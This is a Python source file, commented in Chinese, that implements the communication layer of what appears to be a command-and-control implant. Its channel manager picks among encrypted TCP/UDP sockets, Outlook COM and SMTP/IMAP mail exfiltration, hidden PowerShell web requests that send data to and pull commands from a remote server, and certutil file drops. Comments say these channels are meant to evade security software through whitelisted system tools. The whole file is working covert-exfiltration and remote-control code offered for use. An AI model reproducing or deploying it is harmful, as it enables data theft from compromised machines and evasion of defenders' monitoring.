"""
多通路隐蔽通信模块
根据环境感知结果动态选择最优通信通道
支持: TCP/UDP 加密套接字、Outlook COM 邮件外传、PowerShell/certutil 白名单通路
"""
import socket
import struct
import subprocess
import os
import time
import threading
import logging
from abc import ABC, abstractmethod
from typing import Optional

logger = logging.getLogger("comm")


# ── 通道抽象基类 ─────────────────────────────────────────

class BaseChannel(ABC):
    """通信通道抽象基类"""

    def __init__(self, name: str, crypto_engine, session_id: str):
        self.name = name
        self.crypto = crypto_engine
        self.session_id = session_id
        self.connected = False

    @abstractmethod
    def connect(self, **kwargs) -> bool:
        """建立通道连接"""
        pass

    @abstractmethod
    def send(self, data: bytes, msg_type: str = "cmd") -> bool:
        """发送加密数据"""
        pass

    @abstractmethod
    def recv(self) -> Optional[bytes]:
        """接收并解密数据"""
        pass

    @abstractmethod
    def close(self):
        """关闭通道"""
        pass

    def _encrypt_and_serialize(self, data: bytes, msg_type: str) -> bytes:
        """加密并序列化消息"""
        from shared.crypto import serialize_message
        msg = self.crypto.encrypt_message(
            data, self.session_id, channel=self.name, msg_type=msg_type
        )
        return serialize_message(msg)

    def _deserialize_and_decrypt(self, raw: bytes, offset: int = 0) -> bytes:
        """反序列化并解密消息，密钥交换消息直接返回 payload"""
        from shared.crypto import deserialize_message
        msg, _ = deserialize_message(raw, offset)
        # 密钥交换消息不加密，直接返回 payload
        if msg["header"].get("type") == "key_exchange":
            return msg["payload"]
        return self.crypto.decrypt_message(msg)


# ── TCP 通道 ─────────────────────────────────────────────

class TCPChannel(BaseChannel):
    """TCP 加密套接字通信通道"""

    def __init__(self, crypto_engine, session_id: str):
        super().__init__("tcp", crypto_engine, session_id)
        self.sock = None

    def connect(self, host: str = "0.0.0.0", port: int = 9999, **kwargs) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((host, port))
            self.connected = True
            logger.info(f"TCP connected to {host}:{port}")
            return True
        except Exception as e:
            logger.error(f"TCP connect failed: {e}")
            self.connected = False
            return False

    def send(self, data: bytes, msg_type: str = "result") -> bool:
        if not self.connected or not self.sock:
            return False
        try:
            wire = self._encrypt_and_serialize(data, msg_type)
            self.sock.sendall(wire)
            return True
        except Exception as e:
            logger.error(f"TCP send failed: {e}")
            self.connected = False
            return False

    def recv(self) -> Optional[bytes]:
        """
        接收并解密消息
        返回 None: 超时（正常，继续等待）
        抛出异常: 连接关闭（需要重连）
        """
        if not self.connected or not self.sock:
            return None
        try:
            # 读取 4 字节长度头
            length_data = self._recv_exact(4)
            if not length_data:
                self.connected = False
                raise ConnectionError("Connection closed by remote")
            length = struct.unpack("!I", length_data)[0]
            # 读取消息体
            body = self._recv_exact(length)
            if not body:
                self.connected = False
                raise ConnectionError("Connection closed by remote")
            raw = length_data + body
            return self._deserialize_and_decrypt(raw)
        except socket.timeout:
            # 超时不代表连接断开，返回 None 继续等待
            return None
        except (ConnectionError, ConnectionResetError, BrokenPipeError):
            raise
        except Exception as e:
            logger.error(f"TCP recv failed: {e}")
            self.connected = False
            raise ConnectionError(f"Recv error: {e}")

    def _recv_exact(self, n: int) -> Optional[bytes]:
        """精确接收 n 字节"""
        data = b""
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.connected = False


class TCPServerChannel(BaseChannel):
    """TCP 服务端通道（Controller 端使用）"""

    def __init__(self, crypto_engine, session_id: str):
        super().__init__("tcp_server", crypto_engine, session_id)
        self.server_sock = None
        self.client_sock = None
        self.addr = None

    def listen(self, host: str = "0.0.0.0", port: int = 9999) -> bool:
        try:
            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_sock.bind((host, port))
            self.server_sock.listen(5)
            logger.info(f"TCP server listening on {host}:{port}")
            return True
        except Exception as e:
            logger.error(f"TCP server bind failed: {e}")
            return False

    def accept(self, timeout: float = 30.0) -> bool:
        """等待 Agent 连接"""
        try:
            self.server_sock.settimeout(timeout)
            self.client_sock, self.addr = self.server_sock.accept()
            self.connected = True
            logger.info(f"Agent connected from {self.addr}")
            return True
        except socket.timeout:
            return False
        except Exception as e:
            logger.error(f"Accept failed: {e}")
            return False

    def connect(self, **kwargs) -> bool:
        return self.connected

    def send(self, data: bytes, msg_type: str = "cmd") -> bool:
        if not self.connected or not self.client_sock:
            return False
        try:
            wire = self._encrypt_and_serialize(data, msg_type)
            self.client_sock.sendall(wire)
            return True
        except Exception as e:
            logger.error(f"TCP send failed: {e}")
            self.connected = False
            return False

    def recv(self) -> Optional[bytes]:
        if not self.connected or not self.client_sock:
            return None
        try:
            length_data = self._recv_exact(4)
            if not length_data:
                return None
            length = struct.unpack("!I", length_data)[0]
            body = self._recv_exact(length)
            if not body:
                return None
            raw = length_data + body
            return self._deserialize_and_decrypt(raw)
        except Exception as e:
            logger.error(f"TCP recv failed: {e}")
            self.connected = False
            return None

    def _recv_exact(self, n: int) -> Optional[bytes]:
        data = b""
        while len(data) < n:
            chunk = self.client_sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def close(self):
        if self.client_sock:
            try:
                self.client_sock.close()
            except Exception:
                pass
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        self.connected = False


# ── UDP 通道 ─────────────────────────────────────────────

class UDPChannel(BaseChannel):
    """UDP 加密通信通道"""

    def __init__(self, crypto_engine, session_id: str):
        super().__init__("udp", crypto_engine, session_id)
        self.sock = None
        self.target = None

    def connect(self, host: str = "0.0.0.0", port: int = 9998, **kwargs) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.target = (host, port)
            self.connected = True
            logger.info(f"UDP target set to {host}:{port}")
            return True
        except Exception as e:
            logger.error(f"UDP init failed: {e}")
            return False

    def send(self, data: bytes, msg_type: str = "result") -> bool:
        if not self.connected or not self.sock:
            return False
        try:
            wire = self._encrypt_and_serialize(data, msg_type)
            # UDP 分片：每片最大 65507 字节
            chunk_size = 60000
            total_chunks = (len(wire) + chunk_size - 1) // chunk_size
            for i in range(total_chunks):
                chunk = wire[i * chunk_size:(i + 1) * chunk_size]
                # 添加分片头: [总片数(1B)][当前片号(1B)]
                header = struct.pack("!BB", total_chunks, i)
                self.sock.sendto(header + chunk, self.target)
            return True
        except Exception as e:
            logger.error(f"UDP send failed: {e}")
            return False

    def recv(self) -> Optional[bytes]:
        if not self.connected or not self.sock:
            return None
        try:
            self.sock.settimeout(30)
            fragments = {}
            total_chunks = None

            while True:
                data, addr = self.sock.recvfrom(65535)
                total_chunks = data[0]
                chunk_id = data[1]
                fragments[chunk_id] = data[2:]
                if len(fragments) == total_chunks:
                    break

            # 重组
            raw = b"".join(fragments[i] for i in range(total_chunks))
            return self._deserialize_and_decrypt(raw)
        except socket.timeout:
            return None
        except Exception as e:
            logger.error(f"UDP recv failed: {e}")
            return None

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.connected = False


# ── Outlook COM 邮件外传通道 ─────────────────────────────

class OutlookChannel(BaseChannel):
    """
    通过 Outlook COM 对象实现邮件外传
    需要系统安装 Outlook 且已配置邮箱账户
    """

    def __init__(self, crypto_engine, session_id: str):
        super().__init__("outlook", crypto_engine, session_id)
        self.outlook = None
        self.target_email = ""

    def connect(self, target_email: str = "", **kwargs) -> bool:
        """
        Args:
            target_email: 接收数据的目标邮箱地址
        """
        try:
            import win32com.client
            try:
                self.outlook = win32com.client.Dispatch("Outlook.Application")
            except Exception:
                # COM 连接已运行实例失败时，重启 Outlook 后重试
                logger.info("Retrying: restarting Outlook...")
                import subprocess
                subprocess.run(["taskkill", "/IM", "OUTLOOK.EXE", "/F"],
                               capture_output=True, timeout=5)
                time.sleep(2)
                subprocess.Popen(
                    [r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                time.sleep(5)
                self.outlook = win32com.client.Dispatch("Outlook.Application")
            self.target_email = target_email
            self.connected = True
            logger.info("Outlook COM object created")
            return True
        except Exception as e:
            logger.error(f"Outlook COM init failed: {e}")
            return False

    def send(self, data: bytes, msg_type: str = "exfil") -> bool:
        """将加密数据编码为邮件发送"""
        if not self.connected or not self.outlook:
            return False
        try:
            import base64
            wire = self._encrypt_and_serialize(data, msg_type)
            encoded = base64.b64encode(wire).decode("ascii")

            mail = self.outlook.CreateItem(0)  # olMailItem
            mail.To = self.target_email
            mail.Subject = f"Report_{int(time.time())}"
            mail.Body = encoded
            mail.Send()
            logger.info(f"Data sent via Outlook to {self.target_email}")
            return True
        except Exception as e:
            logger.error(f"Outlook send failed: {e}")
            return False

    def recv(self) -> Optional[bytes]:
        """从收件箱最新未读邮件中提取数据"""
        if not self.connected or not self.outlook:
            return None
        try:
            import base64
            namespace = self.outlook.GetNamespace("MAPI")
            inbox = namespace.GetDefaultFolder(6)  # olFolderInbox
            messages = inbox.Items
            messages.Sort("[ReceivedTime]", True)  # 降序

            for msg in messages:
                if msg.UnRead:
                    try:
                        body = msg.Body.strip()
                        wire = base64.b64decode(body)
                        result = self._deserialize_and_decrypt(wire)
                        msg.UnRead = False
                        return result
                    except Exception:
                        continue
            return None
        except Exception as e:
            logger.error(f"Outlook recv failed: {e}")
            return None

    def close(self):
        self.outlook = None
        self.connected = False


# ── SMTP/IMAP 邮件通道（替代 Outlook COM）────────────────

class SMTPChannel(BaseChannel):
    """
    通过 SMTP/IMAP 协议实现邮件通信
    不依赖 Outlook COM，适用于任何标准邮箱（QQ/163/Gmail 等）
    """

    # QQ 邮箱默认配置
    QQ_CONFIG = {
        "smtp_host": "smtp.qq.com",
        "smtp_port": 465,
        "imap_host": "imap.qq.com",
        "imap_port": 993,
    }

    def __init__(self, crypto_engine, session_id: str):
        super().__init__("smtp", crypto_engine, session_id)
        self.email = ""
        self.auth_code = ""       # QQ 邮箱授权码（非登录密码）
        self.smtp_host = ""
        self.smtp_port = 465
        self.imap_host = ""
        self.imap_port = 993

    def connect(self, email: str = "", auth_code: str = "",
                smtp_host: str = "", smtp_port: int = 465,
                imap_host: str = "", imap_port: int = 993,
                **kwargs) -> bool:
        """
        Args:
            email: 发件/收件邮箱地址
            auth_code: 邮箱授权码（QQ 邮箱在设置->账户中生成）
            smtp_host/port: SMTP 服务器
            imap_host/port: IMAP 服务器
        """
        cfg = self.QQ_CONFIG
        self.email = email
        self.auth_code = auth_code
        self.smtp_host = smtp_host or cfg["smtp_host"]
        self.smtp_port = smtp_port or cfg["smtp_port"]
        self.imap_host = imap_host or cfg["imap_host"]
        self.imap_port = imap_port or cfg["imap_port"]

        if not self.email or not self.auth_code:
            logger.error("SMTP channel requires email and auth_code")
            return False

        # 测试 SMTP 连接
        try:
            import smtplib
            if self.smtp_port == 465:
                server = smtplib.SMTP_SSL(self.smtp_host, self.smtp_port, timeout=10)
            else:
                server = smtplib.SMTP(self.smtp_host, self.smtp_port, timeout=10)
                server.starttls()
            server.login(self.email, self.auth_code)
            server.quit()
            self.connected = True
            logger.info(f"SMTP channel ready: {self.email}")
            return True
        except Exception as e:
            logger.error(f"SMTP connect failed: {e}")
            self.connected = False
            return False

    def send(self, data: bytes, msg_type: str = "exfil") -> bool:
        """加密数据 → base64 → 邮件正文 → SMTP 发送"""
        if not self.connected:
            return False
        try:
            import base64
            import smtplib
            from email.mime.text import MIMEText

            wire = self._encrypt_and_serialize(data, msg_type)
            encoded = base64.b64encode(wire).decode("ascii")

            msg = MIMEText(encoded, "plain", "utf-8")
            msg["Subject"] = f"RPT_{int(time.time())}"
            msg["From"] = self.email
            msg["To"] = self.email  # 发给自己，Controller 从同一收件箱读取

            if self.smtp_port == 465:
                server = smtplib.SMTP_SSL(self.smtp_host, self.smtp_port, timeout=15)
            else:
                server = smtplib.SMTP(self.smtp_host, self.smtp_port, timeout=15)
                server.starttls()
            server.login(self.email, self.auth_code)
            server.sendmail(self.email, [self.email], msg.as_string())
            server.quit()

            logger.info(f"Data sent via SMTP ({len(encoded)} chars)")
            return True
        except Exception as e:
            logger.error(f"SMTP send failed: {e}")
            return False

    def recv(self) -> Optional[bytes]:
        """IMAP 读取收件箱最新未读邮件，解密返回"""
        if not self.connected:
            return None
        try:
            import base64
            import imaplib
            from email import message_from_bytes
            from email.header import decode_header

            imap = imaplib.IMAP4_SSL(self.imap_host, self.imap_port)
            imap.login(self.email, self.auth_code)
            imap.select("INBOX")

            # 搜索未读邮件，按时间倒序取最新一封
            _, msg_nums = imap.search(None, "UNSEEN")
            if not msg_nums[0]:
                imap.logout()
                return None

            latest = msg_nums[0].split()[-1]
            _, msg_data = imap.fetch(latest, "(RFC822)")
            raw_email = msg_data[0][1]
            email_msg = message_from_bytes(raw_email)

            # 提取正文
            body = ""
            if email_msg.is_multipart():
                for part in email_msg.walk():
                    if part.get_content_type() == "text/plain":
                        body = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                        break
            else:
                body = email_msg.get_payload(decode=True).decode("utf-8", errors="ignore")

            body = body.strip()
            if not body:
                imap.logout()
                return None

            # 标记为已读
            imap.store(latest, "+FLAGS", "\\Seen")
            imap.logout()

            wire = base64.b64decode(body)
            return self._deserialize_and_decrypt(wire)
        except Exception as e:
            logger.error(f"IMAP recv failed: {e}")
            return None

    def close(self):
        self.connected = False


# ── PowerShell 白名单通路 ────────────────────────────────

class PowerShellChannel(BaseChannel):
    """
    利用 PowerShell 建立隐蔽通道
    通过 subprocess 调用系统自带的 PowerShell
    """

    def __init__(self, crypto_engine, session_id: str):
        super().__init__("powershell", crypto_engine, session_id)
        self.server_host = ""
        self.server_port = 0

    def connect(self, host: str = "", port: int = 8443, **kwargs) -> bool:
        self.server_host = host
        self.server_port = port
        self.connected = True
        logger.info(f"PowerShell channel configured for {host}:{port}")
        return True

    def send(self, data: bytes, msg_type: str = "result") -> bool:
        """通过 PowerShell WebRequest 发送数据"""
        if not self.connected:
            return False
        try:
            import base64
            wire = self._encrypt_and_serialize(data, msg_type)
            encoded = base64.b64encode(wire).decode("ascii")

            # 使用 PowerShell 的 Invoke-WebRequest 发送
            # 分块避免命令行过长
            ps_cmd = (
                f'$data = "{encoded}"; '
                f'$bytes = [Convert]::FromBase64String($data); '
                f'Invoke-WebRequest -Uri "http://{self.server_host}:{self.server_port}/submit" '
                f'-Method POST -Body $bytes -ContentType "application/octet-stream" '
                f'-TimeoutSec 10 -ErrorAction SilentlyContinue'
            )

            subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-Command", ps_cmd],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=0x08000000  # CREATE_NO_WINDOW
            )
            logger.info("Data sent via PowerShell channel")
            return True
        except Exception as e:
            logger.error(f"PowerShell send failed: {e}")
            return False

    def recv(self) -> Optional[bytes]:
        """通过 PowerShell 从服务器拉取指令"""
        if not self.connected:
            return None
        try:
            ps_cmd = (
                f'$resp = Invoke-WebRequest -Uri "http://{self.server_host}:{self.server_port}/cmd" '
                f'-Method GET -TimeoutSec 30 -ErrorAction SilentlyContinue; '
                f'[Convert]::ToBase64String($resp.Content)'
            )

            result = subprocess.check_output(
                ["powershell", "-WindowStyle", "Hidden", "-Command", ps_cmd],
                timeout=35,
                creationflags=0x08000000
            ).decode("ascii").strip()

            if result:
                import base64
                wire = base64.b64decode(result)
                return self._deserialize_and_decrypt(wire)
            return None
        except subprocess.TimeoutExpired:
            return None
        except Exception as e:
            logger.error(f"PowerShell recv failed: {e}")
            return None

    def close(self):
        self.connected = False


# ── Certutil 白名单通路 ─────────────────────────────────

class CertutilChannel(BaseChannel):
    """
    利用 certutil（系统自带）建立隐蔽通道
    certutil 通常在安全软件白名单中
    """

    def __init__(self, crypto_engine, session_id: str):
        super().__init__("certutil", crypto_engine, session_id)
        self.shared_path = ""

    def connect(self, shared_path: str = "\\\\.", **kwargs) -> bool:
        """
        Args:
            shared_path: 共享目录路径（UNC 路径或本地路径）
        """
        self.shared_path = shared_path
        self.connected = True
        logger.info(f"Certutil channel configured for {shared_path}")
        return True

    def send(self, data: bytes, msg_type: str = "exfil") -> bool:
        """通过 certutil 编码并写入共享目录"""
        if not self.connected:
            return False
        try:
            import base64
            import tempfile

            wire = self._encrypt_and_serialize(data, msg_type)
            encoded = base64.b64encode(wire).decode("ascii")

            # 写入临时文件
            tmp_path = os.path.join(tempfile.gettempdir(), f"up_{int(time.time())}.b64")
            with open(tmp_path, "w") as f:
                f.write(encoded)

            # 用 certutil 解码为二进制到共享目录
            out_path = os.path.join(self.shared_path, f"data_{int(time.time())}.bin")
            subprocess.run(
                ["certutil", "-decode", tmp_path, out_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10,
                creationflags=0x08000000
            )

            # 清理临时文件
            try:
                os.remove(tmp_path)
            except OSError:
                pass

            logger.info(f"Data sent via certutil to {out_path}")
            return True
        except Exception as e:
            logger.error(f"Certutil send failed: {e}")
            return False

    def recv(self) -> Optional[bytes]:
        """从共享目录读取指令文件"""
        if not self.connected:
            return None
        try:
            import glob
            pattern = os.path.join(self.shared_path, "cmd_*.bin")
            files = sorted(glob.glob(pattern), key=os.path.getmtime, reverse=True)

            for cmd_file in files[:1]:  # 只取最新的一条
                # certutil 编码
                b64_file = cmd_file + ".b64"
                subprocess.run(
                    ["certutil", "-encode", cmd_file, b64_file],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=10,
                    creationflags=0x08000000
                )

                with open(b64_file, "r") as f:
                    # 跳过 certutil 添加的头尾行
                    lines = f.readlines()
                    b64_data = "".join(
                        l.strip() for l in lines
                        if not l.startswith("---") and l.strip()
                    )

                wire = __import__("base64").b64decode(b64_data)
                result = self._deserialize_and_decrypt(wire)

                # 处理完删除
                try:
                    os.remove(cmd_file)
                    os.remove(b64_file)
                except OSError:
                    pass

                return result
            return None
        except Exception as e:
            logger.error(f"Certutil recv failed: {e}")
            return None

    def close(self):
        self.connected = False


# ── 通道管理器 ───────────────────────────────────────────

class ChannelManager:
    """
    多通路自适应管理器
    根据环境感知结果选择最优通信通道
    """

    def __init__(self, crypto_engine, session_id: str):
        self.crypto = crypto_engine
        self.session_id = session_id
        self.channels = {}
        self.active_channel = None

    def select_channels(self, env_profile) -> list:
        """
        根据环境画像选择可用通道列表（按优先级排序）

        优先级:
        1. TCP（最可靠，基础通路）
        2. Outlook COM（如果检测到 Outlook）
        3. SMTP/IMAP（通用邮件通道，需要配置凭据）
        4. PowerShell（白名单工具，通用）
        5. UDP（备选）
        6. Certutil（最后手段）
        """
        selected = []

        # TCP 始终可用
        selected.append("tcp")

        # Outlook COM 通路（经典版 Outlook）
        if env_profile.has_outlook():
            selected.append("outlook")

        # SMTP/IMAP 通用邮件通路
        selected.append("smtp")

        # PowerShell 通路（Windows 自带，通常可用）
        selected.append("powershell")

        # UDP 备选
        selected.append("udp")

        # Certutil 通路（最后手段）
        selected.append("certutil")

        logger.info(f"Selected channels: {selected}")
        return selected

    def create_channel(self, channel_type: str) -> BaseChannel:
        """创建指定类型的通道实例"""
        channel_map = {
            "tcp": lambda: TCPChannel(self.crypto, self.session_id),
            "udp": lambda: UDPChannel(self.crypto, self.session_id),
            "outlook": lambda: OutlookChannel(self.crypto, self.session_id),
            "smtp": lambda: SMTPChannel(self.crypto, self.session_id),
            "powershell": lambda: PowerShellChannel(self.crypto, self.session_id),
            "certutil": lambda: CertutilChannel(self.crypto, self.session_id),
        }

        creator = channel_map.get(channel_type)
        if not creator:
            raise ValueError(f"Unknown channel type: {channel_type}")

        channel = creator()
        self.channels[channel_type] = channel
        return channel

    def connect_best(self, env_profile, **kwargs) -> Optional[BaseChannel]:
        """尝试按优先级连接，返回第一个成功的通道"""
        return self.connect_best_excluding(env_profile, exclude=[], **kwargs)

    def connect_best_excluding(self, env_profile, exclude: list = None, **kwargs) -> Optional[BaseChannel]:
        """尝试按优先级连接，排除指定通道类型"""
        selected = self.select_channels(env_profile)
        if exclude:
            selected = [ch for ch in selected if ch not in exclude]

        for ch_type in selected:
            channel = self.create_channel(ch_type)
            try:
                if channel.connect(**kwargs):
                    self.active_channel = channel
                    logger.info(f"Active channel: {ch_type}")
                    return channel
            except Exception as e:
                logger.warning(f"Channel {ch_type} failed: {e}")
                continue

        logger.error("All channels failed")
        return None

    def send(self, data: bytes, msg_type: str = "result") -> bool:
        """通过当前活跃通道发送数据"""
        if self.active_channel:
            return self.active_channel.send(data, msg_type)
        return False

    def recv(self) -> Optional[bytes]:
        """通过当前活跃通道接收数据"""
        if self.active_channel:
            return self.active_channel.recv()
        return None

    def close_all(self):
        """关闭所有通道并清零加密引擎密钥材料"""
        for ch in self.channels.values():
            try:
                ch.close()
            except Exception:
                pass
        self.channels.clear()
        self.active_channel = None
        # 显式清零加密引擎中的密钥材料
        if self.crypto:
            self.crypto.wipe()

